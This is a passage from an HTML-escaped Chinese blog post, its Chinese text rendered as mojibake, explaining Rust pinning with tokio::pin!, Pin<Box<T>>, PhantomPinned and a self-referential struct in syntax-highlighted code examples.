&lt;li>&lt;strong>åœ¨æ ˆä¸Š pin:&lt;/strong> ä½¿ç”¨ &lt;code>tokio::pin!&lt;/code> (æˆ–è€… &lt;code>std::pin::pin!&lt;/code>) å®ï¼Œå°†æ•°æ® pin åœ¨æ ˆä¸Šã€‚&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>å‚è€ƒ &lt;a href="https://docs.rs/tokio/latest/tokio/macro.pin.html">tokio::pin&lt;/a>ã€‚&lt;/p>
&lt;p>ç¤ºä¾‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">tokio&lt;/span>::&lt;span class="n">pin&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">async&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">my_async_fn&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// async logic here
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="cp">#[tokio::main]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">async&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">future&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">my_async_fn&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// å»æ‰ä¸‹é¢è¿™å¥ï¼Œå°†å¯¼è‡´ç¼–è¯‘å¤±è´¥â€¼ï¸
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="fm">pin!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">future&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">future&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="k">await&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// æˆ–è€…ç”¨æ ‡å‡†åº“çš„ local pin æ–¹æ³•ï¼š
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// std::pin::pin!(future).await;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="å¯¹-stream-try-stream-å®ç”Ÿæˆçš„-stream-è¿›è¡Œè¿­ä»£æ—¶">å¯¹ &lt;code>stream!&lt;/code> / &lt;code>try_stream!&lt;/code> å®ç”Ÿæˆçš„ &lt;code>Stream&lt;/code> è¿›è¡Œè¿­ä»£æ—¶&lt;/h3>
&lt;p>å’Œ &lt;code>Future&lt;/code> ç±»ä¼¼ï¼Œç”±äº &lt;code>stream!&lt;/code> / &lt;code>try_stream!&lt;/code> ç”Ÿæˆçš„ Stream åŒæ ·æ˜¯ &lt;code>!Unpin&lt;/code> çš„ï¼Œå› æ­¤ï¼Œåœ¨å¯¹å…¶è¿›è¡Œè¿­ä»£æ“ä½œå‰ï¼ŒåŒæ ·éœ€è¦å…ˆ pin ä½ã€‚&lt;/p>
&lt;p>è¯¦ç»†ä¿¡æ¯å¯å‚è€ƒ &lt;a href="https://tokio.rs/tokio/tutorial/streams">Streams in Tokio&lt;/a>ã€‚&lt;/p>
&lt;h2 id="unpin-å’Œ-pin-box-t-ç¤ºä¾‹">&lt;code>!Unpin&lt;/code> å’Œ &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ç¤ºä¾‹&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">marker&lt;/span>::&lt;span class="n">PhantomPinned&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">pin&lt;/span>::&lt;span class="n">Pin&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>: &lt;span class="nb">String&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>: &lt;span class="o">*&lt;/span>&lt;span class="k">const&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// è¡¨æ˜è¯¥ç±»å‹æœªå®ç° Unpin, å»æ‰è¯¥å­—æ®µåˆ™é»˜è®¤å®ç°äº† Unpin
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_marker&lt;/span>: &lt;span class="nc">PhantomPinned&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">txt&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="kt">str&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">Pin&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nb">Box&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="bp">Self&lt;/span>&lt;span class="o">&amp;gt;&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Test&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">a&lt;/span>: &lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">txt&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">b&lt;/span>: &lt;span class="nc">std&lt;/span>::&lt;span class="n">ptr&lt;/span>::&lt;span class="n">null&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">_marker&lt;/span>: &lt;span class="nc">PhantomPinned&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">boxed&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Box&lt;/span>::&lt;span class="n">pin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">self_ptr&lt;/span>: &lt;span class="o">*&lt;/span>&lt;span class="k">const&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">String&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">boxed&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">unsafe&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">boxed&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_mut&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">get_unchecked_mut&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">self_ptr&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">boxed&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">a&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>: &lt;span class="nc">Pin&lt;/span>&lt;span class="o">&amp;lt;&amp;amp;&lt;/span>&lt;span class="bp">Self&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="kt">str&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">get_ref&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">b&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>: &lt;span class="nc">Pin&lt;/span>&lt;span class="o">&amp;lt;&amp;amp;&lt;/span>&lt;span class="bp">Self&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nb">String&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">unsafe&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">pub&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Test&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;test1&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test2&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Test&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;test2&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;a: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">, b: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_ref&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_ref&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;a: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">, b: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_ref&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="p">(),&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">test2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">as_ref&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="n">b&lt;/span>&lt;span class="p">());&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ä¸‹é¢è¿™è¡Œç¼–è¯‘æŠ¥é”™â—
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// ï— cannot borrow data in dereference of `Pin&amp;lt;Box&amp;lt;Test&amp;gt;&amp;gt;` as mutable rustc (E0596)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// trait `DerefMut` is required to modify through a dereference,
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// but it is not implemented for `Pin&amp;lt;Box&amp;lt;Test&amp;gt;&amp;gt;`
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// test1.a.push_str(&amp;#34;hello&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="unpin-å’Œ-pin-box-t-ç¤ºä¾‹">&lt;code>Unpin&lt;/code> å’Œ &lt;code>Pin&amp;lt;Box&amp;lt;T&amp;gt;&amp;gt;&lt;/code> ç¤ºä¾‹&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">pin&lt;/span>::&lt;span class="n">Pin&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="cp">#[derive(Debug)]&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">Example&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">value&lt;/span>: &lt;span class="kt">i32&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Example&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">increment&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
